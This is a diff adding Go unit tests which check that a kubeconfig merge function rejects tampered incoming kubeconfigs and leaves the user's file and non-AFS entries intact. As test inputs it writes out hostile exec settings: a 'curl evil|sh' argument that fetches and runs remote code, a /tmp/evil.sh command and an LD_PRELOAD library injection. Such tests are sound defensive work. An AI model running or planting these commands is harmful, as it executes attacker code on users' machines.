@@ -197,3 +197,64 @@ func TestMergeRejectsNonMapping(t *testing.T) {
 		t.Error("invalid YAML accepted")
 	}
 }
+
+// FR-014: the service's kubeconfig is checked before it is merged; a hostile one changes nothing.
+func TestMergeRefusesUnsafeIncomingKubeconfig(t *testing.T) {
+	cases := map[string]string{
+		"hostile command":      strings.Replace(incoming, "command: aws", "command: /tmp/evil.sh", 1),
+		"command with path":    strings.Replace(incoming, "command: aws", "command: /usr/local/bin/aws", 1),
+		"shell command":        strings.Replace(incoming, "command: aws", "command: sh", 1),
+		"hostile args":         strings.Replace(incoming, "args: [eks, get-token, --cluster-name, afs, --region, us-east-1]", "args: [-c, \"curl evil|sh\"]", 1),
+		"args do not start":    strings.Replace(incoming, "args: [eks, get-token,", "args: [s3, cp,", 1),
+		"no args":              strings.Replace(incoming, "        args: [eks, get-token, --cluster-name, afs, --region, us-east-1]\n", "", 1),
+		"static token user":    strings.Replace(incoming, "      exec:\n        apiVersion: client.authentication.k8s.io/v1beta1\n        command: aws\n        args: [eks, get-token, --cluster-name, afs, --region, us-east-1]\n", "      token: abc\n", 1),
+		"non AFS user name":    strings.Replace(strings.Replace(incoming, "  - name: afs\n    user:", "  - name: dev\n    user:", 1), "user: afs}", "user: dev}", 1),
+		"non AFS cluster name": strings.Replace(strings.Replace(incoming, "  - name: afs\n    cluster:", "  - name: dev\n    cluster:", 1), "cluster: afs,", "cluster: dev,", 1),
+		"non AFS context name": strings.ReplaceAll(incoming, "afs-payments", "dev"),
+		"prefix lookalike":     strings.Replace(incoming, "- name: afs-payments", "- name: afsx", 1),
+		"env other than AWS_":  strings.Replace(incoming, "        command: aws\n", "        command: aws\n        env: [{name: LD_PRELOAD, value: /tmp/x.so}]\n", 1),
+	}
+	for name, in := range cases {
+		t.Run(name, func(t *testing.T) {
+			if in == incoming {
+				t.Fatal("test case did not change the document")
+			}
+			dir := t.TempDir()
+			path := filepath.Join(dir, "config")
+			if err := os.WriteFile(path, []byte(existing), 0o600); err != nil {
+				t.Fatal(err)
+			}
+			if _, _, err := Merge([]byte(existing), []byte(in), Options{}); err == nil {
+				t.Fatal("merged")
+			}
+			if _, err := Apply(path, []byte(in), Options{}); err == nil {
+				t.Fatal("applied")
+			}
+			if b, _ := os.ReadFile(path); string(b) != existing { //nolint:gosec // test file
+				t.Errorf("file changed:\n%s", b)
+			}
+			entries, _ := os.ReadDir(dir)
+			if len(entries) != 1 {
+				t.Errorf("temporary file left behind: %v", entries)
+			}
+		})
+	}
+}
+
+func TestMergeAcceptsAWSEnvAndDocumentedShape(t *testing.T) {
+	in := strings.Replace(incoming, "        command: aws\n", "        command: aws\n        env: [{name: AWS_REGION, value: us-east-1}]\n", 1)
+	if _, _, err := Merge(nil, []byte(in), Options{AWSProfile: "p"}); err != nil {
+		t.Fatal(err)
+	}
+}
+
+// A same-named entry of the user's that is not AFS's is never replaced.
+func TestMergeNeverReplacesNonAFSEntries(t *testing.T) {
+	out, _, err := Merge([]byte(existing), []byte(incoming), Options{})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(string(out), "dev-token") || !strings.Contains(string(out), "https://dev.example.com") {
+		t.Errorf("a non-AFS entry was lost:\n%s", out)
+	}
+}
